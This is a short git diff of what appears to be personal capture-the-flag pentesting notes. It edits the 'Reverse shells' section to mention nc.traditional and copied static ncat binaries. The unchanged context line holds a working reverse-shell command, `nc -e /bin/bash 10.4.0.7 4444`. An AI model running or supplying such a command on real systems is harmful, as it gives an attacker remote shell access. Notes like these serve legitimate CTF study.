@@ -29,7 +29,7 @@ This will open a proxy on 1080, which you can then setup via proxychains etc.
 
 ## Reverse shells
 
-If netcat with -e exists (very rare in CTFs, in my experience):
+If netcat with -e exists (nc.traditional, very rare in CTFs, in my experience) or if the static ncat binary has been copied across:
 
 `nc -e /bin/bash 10.4.0.7 4444`
 
